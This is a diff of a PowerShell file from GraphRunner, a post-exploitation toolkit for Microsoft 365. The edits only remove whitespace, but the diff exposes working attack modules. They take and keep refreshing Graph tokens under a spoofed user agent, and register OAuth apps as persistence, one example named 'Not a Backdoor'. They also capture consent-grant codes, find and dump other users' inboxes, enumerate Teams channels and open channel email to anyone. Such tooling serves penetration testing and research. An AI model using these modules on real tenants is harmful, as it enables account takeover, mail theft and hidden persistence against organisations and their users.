@@ -1,11 +1,11 @@
 Write-Host -ForegroundColor green "
-  ________                     __      _______      by Beau Bullock (@dafthack)                                
- /_______/___________  ______ |  |____/_______\__ __  ____   ____   ___________ 
+  ________                     __      _______      by Beau Bullock (@dafthack)
+ /_______/___________  ______ |  |____/_______\__ __  ____   ____   ___________
 /___\  __\______\____\ \_____\|__|__\|________/__|__\/____\ /____\_/____\______\
 \    \_\  \  | \// __ \|  |_/ |   Y  \    |   \  |  /   |  \   |  \  ___/|  | \/
- \________/__|  (______/__|   |___|__|____|___/____/|___|__/___|__/\___| >__|   
+ \________/__|  (______/__|   |___|__|____|___/____/|___|__/___|__/\___| >__|
                  Do service principals dream of electric sheep?
-                       
+
 For usage information see the wiki here: https://github.com/dafthack/GraphRunner/wiki
 To list GraphRunner modules run List-GraphRunnerModules
 "
@@ -21,19 +21,19 @@ function Get-GraphTokens{
         Optional Dependencies: None
 
     .DESCRIPTION
-        
-       Get-GraphTokens is the main user authentication module for GraphRunner. Upon authenticating it will store your tokens in the global $tokens variable as well as the tenant ID in $tenantid. To use them with other GraphRunner modules use the Tokens flag (Example. Invoke-DumpApps -Tokens $tokens)     
-    
+
+       Get-GraphTokens is the main user authentication module for GraphRunner. Upon authenticating it will store your tokens in the global $tokens variable as well as the tenant ID in $tenantid. To use them with other GraphRunner modules use the Tokens flag (Example. Invoke-DumpApps -Tokens $tokens)
+
     .PARAMETER UserPasswordAuth
-        
+
         Provide a username and password for authentication instead of using a device code auth.
-    
+
     .PARAMETER Client
-        
+
         Provide a Client to authenticate to. Use Custom to provide your own ClientID.
 
     .PARAMETER ClientID
-        
+
         Provide a ClientID to use with the Custom client option.
 
     .PARAMETER Resource
@@ -41,17 +41,17 @@ function Get-GraphTokens{
         Provide a resource to authenticate to such as https://graph.microsoft.com/
 
     .PARAMETER Device
-        
+
         Provide a device type to use such as Windows or Android.
 
     .PARAMETER Browser
-        
+
         Provide a Browser to spoof.
-    
+
 
 
     .EXAMPLE
-        
+
         C:\PS> Get-GraphTokens
         Description
         -----------
@@ -67,7 +67,7 @@ function Get-GraphTokens{
     [ValidateSet("Yammer","Outlook","MSTeams","Graph","AzureCoreManagement","AzureManagement","MSGraph","DODMSGraph","Custom","Substrate")]
     [String[]]$Client = "MSGraph",
     [Parameter(Position = 3,Mandatory=$False)]
-    [String]$ClientID = "d3590ed6-52b3-4102-aeff-aad2292ab01c",    
+    [String]$ClientID = "d3590ed6-52b3-4102-aeff-aad2292ab01c",
     [Parameter(Position = 4,Mandatory=$False)]
     [String]$Resource = "https://graph.microsoft.com",
     [Parameter(Position = 5,Mandatory=$False)]
@@ -87,8 +87,8 @@ function Get-GraphTokens{
 	}
 	else {
 	   if ($Browser) {
-			$UserAgent = Invoke-ForgeUserAgent -Browser $Browser 
-	   } 
+			$UserAgent = Invoke-ForgeUserAgent -Browser $Browser
+	   }
 	   else {
 			$UserAgent = Invoke-ForgeUserAgent
 	   }
@@ -135,14 +135,14 @@ function Get-GraphTokens{
         if($ExternalCall){
             return $tokens
         }
-    
+
     }
     else{
         If($tokens){
             $newtokens = $null
             while($newtokens -notlike "Yes"){
                 Write-Host -ForegroundColor cyan "[*] It looks like you already tokens set in your `$tokens variable. Are you sure you want to authenticate again?"
-                $answer = Read-Host 
+                $answer = Read-Host
                 $answer = $answer.ToLower()
                 if ($answer -eq "yes" -or $answer -eq "y") {
                     Write-Host -ForegroundColor yellow "[*] Initiating device code login..."
@@ -226,36 +226,36 @@ function Invoke-AutoTokenRefresh{
         Optional Dependencies: None
 
     .DESCRIPTION
-        
+
        This module will refresh a Microsoft ID token at specified intervals.
-    
+
     .PARAMETER RefreshToken
-        
+
         Supply a refresh token to re-authenticate.
 
     .PARAMETER tenantid
-        
+
         Supply a tenant domain or ID to authenticate to.
 
     .PARAMETER RefreshInterval
-        
+
         Supply an interval in minutes to refresh the token. Default 5 minutes.
-    
+
     .PARAMETER InitializationDelay
 
         Supply a delay before starting to refresh in minutes. Devault is 0.
-    
+
     .PARAMETER OutFile
-        
+
         Supply file name to save to. This will overwrite the current file.
 
     .EXAMPLE
-        
+
         C:\PS> Invoke-AutoTokenRefresh - RefreshToken "0.A.." -tenantid "company.com" -Outfile .\access_token.txt
         Description
         -----------
         This command will use the refresh token to aquire a new access_token, save it to the $tokens variable and to the Outfile.
-    
+
 
     #>
     [cmdletbinding()]
@@ -281,7 +281,7 @@ function Invoke-AutoTokenRefresh{
         Start-Sleep -Seconds (60 * $InitializationDelay)
     }
 
-    while($true){ 
+    while($true){
         if(!$RefreshToken){
             write-host -ForegroundColor red '[*] A refresh token is required.'
             break
@@ -306,7 +306,7 @@ function Invoke-AutoTokenRefresh{
         catch {
             $details=$_.ErrorDetails.Message | ConvertFrom-Json
             Write-Output $details.error
-        } 
+        }
         if($reftokens)
             {
                 $global:tokens = $reftokens
@@ -329,7 +329,7 @@ function Invoke-AutoTokenRefresh{
                 }
                 Start-Sleep -Seconds (60 * $RefreshInterval)
             }
-        } 
+        }
 }
 
 function Invoke-RefreshGraphTokens {
@@ -467,34 +467,34 @@ function Invoke-InjectOAuthApp{
         Optional Dependencies: None
 
     .DESCRIPTION
-        
-       This is a CLI tool for automating the deployment of an app registration to a Microsoft Azure tenant. In the event that the Azure portal is locked down this may provide an additional mechanism for app deployment, provided that user's are allowed to register apps in the tenant.        
-    
+
+       This is a CLI tool for automating the deployment of an app registration to a Microsoft Azure tenant. In the event that the Azure portal is locked down this may provide an additional mechanism for app deployment, provided that user's are allowed to register apps in the tenant.
+
     .PARAMETER AppName
-        
+
         The display name of the App Registration. This is what will be displayed on the consent page.
-    
+
     .PARAMETER ReplyUrl
-        
+
         The reply URL to redirect a user to after app consent. This is where you will want to capture the OAuth code and complete the flow to obtain an access token and refresh token.
-    
+
     .PARAMETER Scope
-        
+
         Delegated Microsoft Graph permissions to scope to the app. Example: Mail.Read, User.ReadBasic.All, etc. Scope items need to be comma separated with each item in double quotes like this (-scope "Mail.Read","openid","email","profile","offline_access")
-    
+
      .PARAMETER Tokens
-        
-        Provide an already authenticated access token. 
+
+        Provide an already authenticated access token.
 
     .EXAMPLE
-        
+
         C:\PS> Invoke-InjectOAuthApp -AppName "Win Defend for M365" -ReplyUrl "https://windefend.azurewebsites.net" -scope "openid","Mail.Read","email","profile","offline_access"
         Description
         -----------
         This command will inject an app registration with the display name of "Win Defend for M365" with a scope of openid, Mail.Read, email, profile, and offline_access
-    
+
     .EXAMPLE
-        
+
         C:\PS> Invoke-InjectOAuthApp -AppName "Not a Backdoor" -ReplyUrl "http://localhost:10000" -scope "op backdoor" -Tokens $tokens
         Description
         -----------
@@ -514,7 +514,7 @@ function Invoke-InjectOAuthApp{
     [Parameter(Position = 2, Mandatory = $True)]
     [string[]]
     $Scope,
-    
+
     [Parameter(Position = 3, Mandatory = $False)]
     [object[]]
     $Tokens
@@ -524,11 +524,11 @@ function Invoke-InjectOAuthApp{
     }
     else{
          # Login
-         Write-Host -ForegroundColor yellow "[*] First, you need to login as the user you want to deploy the app as." 
+         Write-Host -ForegroundColor yellow "[*] First, you need to login as the user you want to deploy the app as."
          Write-Host -ForegroundColor yellow "[*] If you already have tokens you can use the -Tokens parameter to pass them to this function."
          while($auth -notlike "Yes"){
                 Write-Host -ForegroundColor cyan "[*] Do you want to authenticate now (yes/no)?"
-                $answer = Read-Host 
+                $answer = Read-Host
                 $answer = $answer.ToLower()
                 if ($answer -eq "yes" -or $answer -eq "y") {
                     Write-Host -ForegroundColor yellow "[*] Running Get-GraphTokens now..."
@@ -542,7 +542,7 @@ function Invoke-InjectOAuthApp{
                 }
             }
     }
-    $access_token = $tokens.access_token        
+    $access_token = $tokens.access_token
     $Headers = @{
         Authorization = "Bearer $access_token"
     }
@@ -577,8 +577,8 @@ function Invoke-InjectOAuthApp{
         # Check if there's a nextLink
         if ($jsonData.'@odata.nextLink') {
             $initialUrl = $jsonData.'@odata.nextLink'
-        } 
-        else { 
+        }
+        else {
             break
         }
     } while ($true)
@@ -614,7 +614,7 @@ function Invoke-InjectOAuthApp{
     foreach ($item in $Scope){
         $variableName = $item -replace "[\W\d]", ""  # Remove non-alphanumeric characters and digits
         $variableName = $variableName + "Scope"
-    
+
 
         $scopeItem = $spnsjson.oauth2PermissionScopes | Where-Object { $_.value -eq "$item" } |select-object id
         $scopeId = ('"' + $scopeItem.Id +'"')
@@ -623,7 +623,7 @@ function Invoke-InjectOAuthApp{
         Write-Host ($item + " : " + $scopeId)
         $scopeurl += "$item%20"
         $accesslist += '{"id": ' + $scopeId + ',"type": "Scope"},'
-    
+
         # Store the scope ID in the hashtable
         $scopeIds[$variableName] = $scopeId
         }
@@ -749,8 +749,8 @@ function Invoke-RefreshToSharePointToken {
 	}
 	else {
 	   if ($Browser) {
-			$UserAgent = Invoke-ForgeUserAgent -Browser $Browser 
-	   } 
+			$UserAgent = Invoke-ForgeUserAgent -Browser $Browser
+	   }
 	   else {
 			$UserAgent = Invoke-ForgeUserAgent
 	   }
@@ -782,13 +782,13 @@ function Invoke-ImmersiveFileReader{
         Optional Dependencies: None
 
     .DESCRIPTION
-        
+
        Simple module to read a file with the immersive reader.
 
     .PARAMETER SharePointDomain
 
         The target SharePoint domain. e.g. targetcompany.sharepoint.com
-    
+
     .PARAMETER DriveID
 
         The DriveID.
@@ -796,9 +796,9 @@ function Invoke-ImmersiveFileReader{
     .PARAMETER FileID
 
         The ID of the file to open.
-    
+
     .EXAMPLE
-        
+
         C:\PS> Invoke-ImmersiveFileReader -SharePointDomain targetcompany.sharepoint.com -DriveID <drive ID> -FileID <FileID>
         Description
         -----------
@@ -836,8 +836,8 @@ function Invoke-ImmersiveFileReader{
         }
         else {
            if ($Browser) {
-                $UserAgent = Invoke-ForgeUserAgent -Browser $Browser 
-           } 
+                $UserAgent = Invoke-ForgeUserAgent -Browser $Browser
+           }
            else {
                 $UserAgent = Invoke-ForgeUserAgent
            }
@@ -849,11 +849,11 @@ function Invoke-ImmersiveFileReader{
     }
     else{
          # Login
-         Write-Host -ForegroundColor yellow "[*] First, you need to login." 
+         Write-Host -ForegroundColor yellow "[*] First, you need to login."
          Write-Host -ForegroundColor yellow "[*] If you already have tokens you can use the -Tokens parameter to pass them to this function."
          while($auth -notlike "Yes"){
                 Write-Host -ForegroundColor cyan "[*] Do you want to authenticate now (yes/no)?"
-                $answer = Read-Host 
+                $answer = Read-Host
                 $answer = $answer.ToLower()
                 if ($answer -eq "yes" -or $answer -eq "y") {
                     Write-Host -ForegroundColor yellow "[*] Running Get-GraphTokens now..."
@@ -869,9 +869,9 @@ function Invoke-ImmersiveFileReader{
     }
     $Headers["Host"] = 'southcentralus1-mediap.svc.ms'
     $Headers["Accept-Language"] = "en-US"
-    
+
     Invoke-RefreshToSharePointToken -domain $SharePointDomain -ClientId "d326c1ce-6cc6-4de2-bebc-4591e5e13ef0" -Tokens $tokens -Device $Device -Browser $Browser
-   
+
     try {
         $request = Invoke-WebRequest -UseBasicParsing -Headers $Headers -Method GET -Uri "https://southcentralus1-mediap.svc.ms/transform/imreader?provider=spo&inputFormat=txt&cs=fFNQTw&docid=https%3A%2F%2F$($SharePointDomain)%3A443%2F_api%2Fv2.0%2Fdrives%2F$($DriveID)%2Fitems%2F$($FileID)%3Fversion%3DPublished&access_token=$($global:SharePointToken.access_token)&nocache=true"
         }catch{
@@ -891,19 +891,19 @@ function Invoke-DeleteOAuthApp{
         Optional Dependencies: None
 
     .DESCRIPTION
-        
+
        Simple module to delete an app registration. Use the Object ID (Output at the end of Invoke-InjectOAuthApp) not the app ID.
 
     .PARAMETER Tokens
 
-        Provide an already authenticated access token. 
+        Provide an already authenticated access token.
 
     .PARAMETER ObjectID
 
         The Object ID of the app registration you want to delete.
-    
+
     .EXAMPLE
-        
+
         C:\PS> Invoke-DeleteOAuthApp -Tokens $tokens -ObjectID <object ID of app>
         Description
         -----------
@@ -947,23 +947,23 @@ Function Invoke-GraphOpenInboxFinder{
         Optional Dependencies: None
 
     .DESCRIPTION
-        
+
        A module that can be used to find inboxes of other users in a tenant that are readable by the current user. This oftentimes happens when a user has misconfigured their mailbox to allow others to read mail items within it. NOTE: You must have Mail.Read.Shared or Mail.ReadWrite.Shared permissions to read other mailboxes with the Graph.
 
     .PARAMETER Tokens
 
-        Provide an already authenticated access token. 
+        Provide an already authenticated access token.
 
     .PARAMETER UserList
 
         Userlist of users to check (one per line)
-    
+
     .EXAMPLE
-        
+
         C:\PS> Invoke-GraphOpenInboxFinder -Tokens $tokens -UserList userlist.txt
         Description
         -----------
-        Using this module will attempt to access each inbox in the userlist file as the current user. 
+        Using this module will attempt to access each inbox in the userlist file as the current user.
 
     #>
 
@@ -983,14 +983,14 @@ Function Invoke-GraphOpenInboxFinder{
         Write-Host -ForegroundColor yellow "[*] No tokens detected. Pass your authenticated tokens to this module with the -Tokens option. "
         return
     }
-    
+
     $Mailboxes = @(Get-Content -Path $userlist)
-    
+
     if (!$Mailboxes){return}
 
     $count = $Mailboxes.count
     $curr_mbx = 0
-    Write-Host -ForegroundColor yellow "[*] Note: To read other user's mailboxes your token needs to be scoped to the Mail.Read.Shared or Mail.ReadWrite.Shared permissions."   
+    Write-Host -ForegroundColor yellow "[*] Note: To read other user's mailboxes your token needs to be scoped to the Mail.Read.Shared or Mail.ReadWrite.Shared permissions."
 
     Write-Output "`n`r"
     Write-Output "[*] Checking access to mailboxes for each email address..."
@@ -1000,11 +1000,11 @@ Function Invoke-GraphOpenInboxFinder{
         $request = ""
         Write-Host -nonewline "$curr_mbx of $count mailboxes checked`r"
         $curr_mbx += 1
-        try { $request = Invoke-WebRequest -UseBasicParsing -Method GET -Uri "https://graph.microsoft.com/v1.0/users/$mbx/mailFolders/Inbox/messages" -Headers @{"Authorization" = "Bearer $access_token"} 
+        try { $request = Invoke-WebRequest -UseBasicParsing -Method GET -Uri "https://graph.microsoft.com/v1.0/users/$mbx/mailFolders/Inbox/messages" -Headers @{"Authorization" = "Bearer $access_token"}
         }catch{
             $err = $_.Exception.Response.StatusCode.Value__
         }
-    
+
         If ($request.StatusCode -eq 200){
             Write-Host -ForegroundColor Green "[*] SUCCESS! Inbox of $mbx is readable."
             $out = $request.Content | ConvertFrom-Json
@@ -1026,7 +1026,7 @@ Function Get-AzureAppTokens{
         Optional Dependencies: None
 
     .DESCRIPTION
-        
+
        This module can assist with completing an OAuth flow to obtain access tokens for an Azure App Registration. After obtaining an authorization code it can be utilized with a set of app registration credentials (client id and secret) to complete the flow.
 
     .PARAMETER ClientId
@@ -1036,25 +1036,25 @@ Function Get-AzureAppTokens{
     .PARAMETER ClientSecret
 
         The secret of the app
-    
+
     .PARAMETER RedirectUri
 
         The Redirect URI used in the authorization request
-    
+
     .PARAMETER Scope
 
         Permission scope of the app "Mail.Read openid etc"
-    
+
     .PARAMETER AuthCode
 
         The authorization code retrieved from the request sent to the redirect URI during the OAuth flow
 
     .EXAMPLE
-        
+
         C:\PS> Get-AzureAppTokens -ClientId "13483541-1337-4a13-1234-0123456789ABC" -ClientSecret "v-Q8Q~fEXAMPLEEXAMPLEDsmKpQw_Wwd57-albMZ" -RedirectUri "https://YOURREDIRECTWEBSERVER.azurewebsites.net" -scope "openid profile offline_access email User.Read User.ReadBasic.All Mail.Read" -AuthCode "0.AUYAME_74EXAMPLEUZSUBZqrWXZOtU7Jh4..."
         -----------
         This will authenticate as an app registration (service principal) while completing an OAuth flow using the AuthCode provided. This would be useful in a situation where you have harvested an OAuth code during a consent grant flow.
-    
+
     #>
 
     Param
@@ -1118,8 +1118,8 @@ Function Get-AzureAppTokens{
 
 Function Invoke-CheckAccess{
     <#
-        .SYNOPSIS 
-            
+        .SYNOPSIS
+
             A simple module for checking Graph access.
 
     #>
@@ -1137,8 +1137,8 @@ Function Invoke-CheckAccess{
 
 Function Get-UserObjectID{
     <#
-        .SYNOPSIS 
-            
+        .SYNOPSIS
+
             A simple module to retrieve a user's object ID.
 
     #>
@@ -1167,7 +1167,7 @@ Function Invoke-RefreshAzureAppTokens{
         Optional Dependencies: None
 
     .DESCRIPTION
-        
+
        This module refreshes an Azure App token.
 
     .PARAMETER ClientId
@@ -1177,28 +1177,28 @@ Function Invoke-RefreshAzureAppTokens{
     .PARAMETER ClientSecret
 
         The secret of the app
-    
+
     .PARAMETER RedirectUri
 
         The Redirect URI used in the authorization request
-    
+
     .PARAMETER Scope
 
         Permission scope of the app "Mail.Read openid etc"
-    
+
     .PARAMETER RefreshToken
 
         A refresh token associated with the app
 
     .EXAMPLE
-        
+
         C:\PS> Invoke-RefreshAzureAppTokens -ClientId "13483541-1337-4a13-1234-0123456789ABC" -ClientSecret "v-Q8Q~fEXAMPLEEXAMPLEDsmKpQw_Wwd57-albMZ" -RedirectUri "https://YOURREDIRECTWEBSERVER.azurewebsites.net" -scope "openid profile offline_access email User.Read User.ReadBasic.All Mail.Read" -RefreshToken "0.AUYAME_75cEXAMPLEUBZqrWd22WdOz..."
         -----------
         This will refresh your Azure app tokens.
 
     #>
 
-    
+
 Param
 (
     [Parameter(Position = 0, Mandatory = $false)]
@@ -1251,7 +1251,7 @@ Function Invoke-AutoOAuthFlow{
         Optional Dependencies: None
 
     .DESCRIPTION
-        
+
        Whenever a user consents to an OAuth app their browser sends a request to a specified redirect URI to provide an authorization code. In situations where the user is remote you would most likely want to stand up a web server and use something like the basic PHP redirector included in this repo to capture the code. If we are creating persistence within an account we control it's possible to complete this flow by directing the browser to localhost. This modules stands up a minimal web server to listen for this request and completes the OAuth flow with the provided app registration credentials.
 
     .PARAMETER ClientId
@@ -1261,17 +1261,17 @@ Function Invoke-AutoOAuthFlow{
     .PARAMETER ClientSecret
 
         The secret of the app
-    
+
     .PARAMETER RedirectUri
 
         The Redirect URI used in the authorization request
-    
+
     .PARAMETER Scope
 
         Permission scope of the app "Mail.Read openid etc"
-    
+
     .EXAMPLE
-        
+
         C:\PS> Invoke-AutoOAuthFlow -ClientId "13483541-1337-4a13-1234-0123456789ABC" -ClientSecret "v-Q8Q~fEXAMPLEEXAMPLEDsmKpQw_Wwd57-albMZ" -RedirectUri "http://localhost:10000" -scope "openid profile offline_access email User.Read User.ReadBasic.All Mail.Read"
         -----------
         This will spin up a webserver on your localhost port 10000 to catch the auth code during consent grant.
@@ -1295,7 +1295,7 @@ Function Invoke-AutoOAuthFlow{
     [string]
     $RedirectUri = ""
     )
-    
+
     Add-Type -AssemblyName System.Web
 
     $uri = [System.Uri]$RedirectUri
@@ -1322,7 +1322,7 @@ Function Invoke-AutoOAuthFlow{
         # Capture the OAuth code from the query parameters
         $queryParams = [System.Web.HttpUtility]::ParseQueryString($request.Url.Query)
         $oauthCode = $queryParams["code"]
-            
+
         Write-Host "Captured OAuth code: $oauthCode"
 
         # Respond to the client
@@ -1330,7 +1330,7 @@ Function Invoke-AutoOAuthFlow{
         $responseBytes = [System.Text.Encoding]::UTF8.GetBytes($responseText)
         $response.OutputStream.Write($responseBytes, 0, $responseBytes.Length)
         $response.Close()
-            
+
         if($oauthCode -notin $oauthcodes){
         Get-AzureAppTokens -ClientId $ClientID -ClientSecret $ClientSecret -RedirectUri $RedirectUri -scope $Scope -AuthCode $oauthCode
         }
@@ -1354,7 +1354,7 @@ Function Get-Inbox{
         Optional Dependencies: None
 
     .DESCRIPTION
-        
+
        This module will pull the latest emails from the inbox of a particular user. NOTE: This is the module you want to use if you are reading mail from a shared mailbox.
 
     .PARAMETER Tokens
@@ -1364,20 +1364,20 @@ Function Get-Inbox{
     .PARAMETER userId
 
         Email address of the mailbox you want to read
-    
+
     .PARAMETER TotalMessages
 
         Default is 25, Max is 1000
-    
+
     .PARAMETER OutFile
 
         File to output the results to
-    
+
     .EXAMPLE
-        
+
         C:\PS> Get-Inbox -Tokens $tokens -userid deckard@tyrellcorporation.io -TotalMessages 50 -OutFile emails.csv
         -----------
-        This will connect to the specified userid's inbox and pull the latest 50 messages. 
+        This will connect to the specified userid's inbox and pull the latest 50 messages.
 
     #>
     param(
@@ -1395,15 +1395,15 @@ Function Get-Inbox{
     $OutFile = ""
     )
     if($Tokens){
-            Write-Host -ForegroundColor yellow "[*] Using the provided access tokens."   
+            Write-Host -ForegroundColor yellow "[*] Using the provided access tokens."
     }
     else{
          # Login
-         Write-Host -ForegroundColor yellow "[*] First, you need to login." 
+         Write-Host -ForegroundColor yellow "[*] First, you need to login."
          Write-Host -ForegroundColor yellow "[*] If you already have tokens you can use the -Tokens parameter to pass them to this function."
          while($auth -notlike "Yes"){
                 Write-Host -ForegroundColor cyan "[*] Do you want to authenticate now (yes/no)?"
-                $answer = Read-Host 
+                $answer = Read-Host
                 $answer = $answer.ToLower()
                 if ($answer -eq "yes" -or $answer -eq "y") {
                     Write-Host -ForegroundColor yellow "[*] Running Get-GraphTokens now..."
@@ -1417,8 +1417,8 @@ Function Get-Inbox{
                 }
             }
     }
-    $access_token = $tokens.access_token   
-    [string]$refresh_token = $tokens.refresh_token 
+    $access_token = $tokens.access_token
+    [string]$refresh_token = $tokens.refresh_token
 
     $request = Invoke-WebRequest -UseBasicParsing -Method GET -Uri "https://graph.microsoft.com/v1.0/users/$userid/mailFolders/Inbox/messages?`$top=$TotalMessages" -Headers @{"Authorization" = "Bearer $access_token"}
     $out = $request.Content | ConvertFrom-Json
@@ -1438,10 +1438,10 @@ Function Get-Inbox{
                         "Date" = $date
                         "Body" = $body
                     }
-    
+
             $resultsList += New-Object PSObject -Property $LogInfo
             Write-Output "Subject: $subject | Sender: $sender | Receivers: $($receivers -join ', ') | Date: $date | Message Preview: $preview"
-            Write-Output ("=" * 80) 
+            Write-Output ("=" * 80)
             }
     if($OutFile){
         Write-Host -ForegroundColor yellow "[*] Writing results to $OutFile"
@@ -1460,18 +1460,18 @@ function Get-TeamsApps{
         Optional Dependencies: None
 
     .DESCRIPTION
-        
-    This module enumerates all accessible Teams chat channel and grabs the URLs for all installed apps in side each channel.     
+
+    This module enumerates all accessible Teams chat channel and grabs the URLs for all installed apps in side each channel.
 
     .PARAMETER Tokens
 
         Pass the $tokens global variable after authenticating to this parameter
-  
+
     .EXAMPLE
-        
-        C:\PS> Get-TeamsApps -Tokens $tokens 
+
+        C:\PS> Get-TeamsApps -Tokens $tokens
         -----------
-        This will enumerates all accessible Teams chat channel and grabs the URLs for all installed apps in side each channel. 
+        This will enumerates all accessible Teams chat channel and grabs the URLs for all installed apps in side each channel.
 
     #>
     Param (
@@ -1481,14 +1481,14 @@ function Get-TeamsApps{
         )
         if(!$Tokens){
             if ($global:tokens){
-                $tokens = $global:tokens   
+                $tokens = $global:tokens
             } else {
                 # Login
-                Write-Host -ForegroundColor yellow "[*] First, you need to login." 
+                Write-Host -ForegroundColor yellow "[*] First, you need to login."
                 Write-Host -ForegroundColor yellow "[*] If you already have tokens you can use the -Tokens parameter to pass them to this function."
                 while($auth -notlike "Yes"){
                     Write-Host -ForegroundColor cyan "[*] Do you want to authenticate now (yes/no)?"
-                    $answer = Read-Host 
+                    $answer = Read-Host
                     $answer = $answer.ToLower()
                     if ($answer -eq "yes" -or $answer -eq "y") {
                         Write-Host -ForegroundColor yellow "[*] Running Get-GraphTokens now..."
@@ -1502,8 +1502,8 @@ function Get-TeamsApps{
                     }
                 }
             }
-        }    
-    $access_token = $tokens.access_token   
+        }
+    $access_token = $tokens.access_token
     $headers = @{
         Authorization = "Bearer $access_token"
         "Content-Type" = "application/json"
@@ -1539,26 +1539,26 @@ function Get-TeamsApps{
 function Get-TeamsChannels{
     <#
     .SYNOPSIS
-        This module enumerates all accessible teams and the channels a user has access to. 
+        This module enumerates all accessible teams and the channels a user has access to.
         Author: Matt Eidelberg (@Tyl0us)
         License: MIT
         Required Dependencies: None
         Optional Dependencies: None
 
     .DESCRIPTION
-        
-        This module enumerates all accessible teams and their channels a user has access to. 
+
+        This module enumerates all accessible teams and their channels a user has access to.
 
 
     .PARAMETER Tokens
 
         Pass the $tokens global variable after authenticating to this parameter
-  
+
     .EXAMPLE
-        
+
         C:\PS> Get-TeamsChannels -Tokens $tokens
         -----------
-        This module enumerates all accessible teams and their channels a user has access to. 
+        This module enumerates all accessible teams and their channels a user has access to.
 
     #>
     Param (
@@ -1568,14 +1568,14 @@ function Get-TeamsChannels{
         )
         if(!$Tokens){
             if ($global:tokens){
-                $tokens = $global:tokens   
+                $tokens = $global:tokens
             } else {
                 # Login
-                Write-Host -ForegroundColor yellow "[*] First, you need to login." 
+                Write-Host -ForegroundColor yellow "[*] First, you need to login."
                 Write-Host -ForegroundColor yellow "[*] If you already have tokens you can use the -Tokens parameter to pass them to this function."
                 while($auth -notlike "Yes"){
                     Write-Host -ForegroundColor cyan "[*] Do you want to authenticate now (yes/no)?"
-                    $answer = Read-Host 
+                    $answer = Read-Host
                     $answer = $answer.ToLower()
                     if ($answer -eq "yes" -or $answer -eq "y") {
                         Write-Host -ForegroundColor yellow "[*] Running Get-GraphTokens now..."
@@ -1590,14 +1590,14 @@ function Get-TeamsChannels{
                 }
             }
         }
-          
-    $accesstoken = $tokens.access_token   
-    [string]$refreshtoken = $tokens.refresh_token 
+
+    $accesstoken = $tokens.access_token
+    [string]$refreshtoken = $tokens.refresh_token
 
     $scope = "https://outlook.office365.com/connectors/.default openid profile offline_access"
     $grantType = "refresh_token"
 
-    $access_token = $tokens.access_token   
+    $access_token = $tokens.access_token
     $teamsheaders = @{
         Authorization  = "Bearer $access_token"
         "Content-Type" = "application/json"
@@ -1628,7 +1628,7 @@ function Get-ChannelUsersEnum{
         Optional Dependencies: None
 
     .DESCRIPTION
-        
+
         This module enumerates a defined channel to see how many people are in a channel and who they are.
 
     .PARAMETER Tokens
@@ -1637,14 +1637,14 @@ function Get-ChannelUsersEnum{
 
     .PARAMETER Channel
 
-        The channel name to enumerate 
-  
+        The channel name to enumerate
+
     .PARAMETER Teams
 
-        The team name that the channel resides in 
+        The team name that the channel resides in
 
     .EXAMPLE
-        
+
         C:\PS> Get-ChannelUsersEnum -Tokens $tokens -Channel "ChannelName" -Teams "TeamName"
         -----------
         This module enumerates a defined channel to see how many people are in a channel and who they are.
@@ -1663,14 +1663,14 @@ function Get-ChannelUsersEnum{
         )
         if(!$Tokens){
             if ($global:tokens){
-                $tokens = $global:tokens   
+                $tokens = $global:tokens
             } else {
                 # Login
-                Write-Host -ForegroundColor yellow "[*] First, you need to login." 
+                Write-Host -ForegroundColor yellow "[*] First, you need to login."
                 Write-Host -ForegroundColor yellow "[*] If you already have tokens you can use the -Tokens parameter to pass them to this function."
                 while($auth -notlike "Yes"){
                     Write-Host -ForegroundColor cyan "[*] Do you want to authenticate now (yes/no)?"
-                    $answer = Read-Host 
+                    $answer = Read-Host
                     $answer = $answer.ToLower()
                     if ($answer -eq "yes" -or $answer -eq "y") {
                         Write-Host -ForegroundColor yellow "[*] Running Get-GraphTokens now..."
@@ -1684,17 +1684,17 @@ function Get-ChannelUsersEnum{
                     }
                 }
             }
-        }    
+        }
         $accesstoken = $tokens.access_token
         $channelString = $Channel
-        [string]$refreshtoken = $tokens.refresh_token 
+        [string]$refreshtoken = $tokens.refresh_token
 
         $scope = "https://outlook.office365.com/connectors/.default openid profile offline_access"
         $grantType = "refresh_token"
 
 
         ### addded logic to loop through all teams, to get the teams ID and then the channels and their IDs
-        $access_token = $tokens.access_token   
+        $access_token = $tokens.access_token
         $teamsheaders = @{
             Authorization  = "Bearer $access_token"
             "Content-Type" = "application/json"
@@ -1722,7 +1722,7 @@ function Get-ChannelUsersEnum{
                     }
                 }
                 if ($channelFound) {
-                    break 
+                    break
                 } elseif (-not $Teams) {
                     continue
                 } else {
@@ -1760,7 +1760,7 @@ function Get-ChannelEmail{
         Optional Dependencies: None
 
     .DESCRIPTION
-        
+
         This module enumerates a defined channel for an email address and sets the sender type to Anyone. If there is no email address, it then creates one and sets the sender type to Anyone.
 
     .PARAMETER Tokens
@@ -1770,13 +1770,13 @@ function Get-ChannelEmail{
     .PARAMETER Channel
 
         The channel name to set or create the email address for
-  
+
     .PARAMETER Teams
 
-        The team name that the channel resides in 
+        The team name that the channel resides in
 
     .EXAMPLE
-        
+
         C:\PS> Get-ChannelEmail -Tokens $tokens -Channel "ChannelName" -Teams "TeamName"
         -----------
         This module enumerates a defined channel for an email address and sets the sender type to Anyone. If there is no email address, it then creates one and sets the sender type to Anyone.
@@ -1795,14 +1795,14 @@ function Get-ChannelEmail{
         )
         if(!$Tokens){
             if ($global:tokens){
-                $tokens = $global:tokens   
+                $tokens = $global:tokens
             } else {
                 # Login
-                Write-Host -ForegroundColor yellow "[*] First, you need to login." 
+                Write-Host -ForegroundColor yellow "[*] First, you need to login."
                 Write-Host -ForegroundColor yellow "[*] If you already have tokens you can use the -Tokens parameter to pass them to this function."
                 while($auth -notlike "Yes"){
                     Write-Host -ForegroundColor cyan "[*] Do you want to authenticate now (yes/no)?"
-                    $answer = Read-Host 
+                    $answer = Read-Host
                     $answer = $answer.ToLower()
                     if ($answer -eq "yes" -or $answer -eq "y") {
                         Write-Host -ForegroundColor yellow "[*] Running Get-GraphTokens now..."
@@ -1816,9 +1816,9 @@ function Get-ChannelEmail{
                     }
                 }
             }
-        }    
-        $accesstoken = $tokens.access_token   
-        [string]$refreshtoken = $tokens.refresh_token 
+        }
+        $accesstoken = $tokens.access_token
+        [string]$refreshtoken = $tokens.refresh_token
 
         $scope = "https://outlook.office365.com/connectors/.default openid profile offline_access"
         $grantType = "refresh_token"
@@ -1862,7 +1862,7 @@ function Get-ChannelEmail{
         $url = 'https://outlook.office.com'
         $WebSession.Headers.Clear()
 
-        $access_token = $tokens.access_token   
+        $access_token = $tokens.access_token
         $teamsheaders = @{
             Authorization  = "Bearer $access_token"
             "Content-Type" = "application/json"
@@ -1883,11 +1883,11 @@ function Get-ChannelEmail{
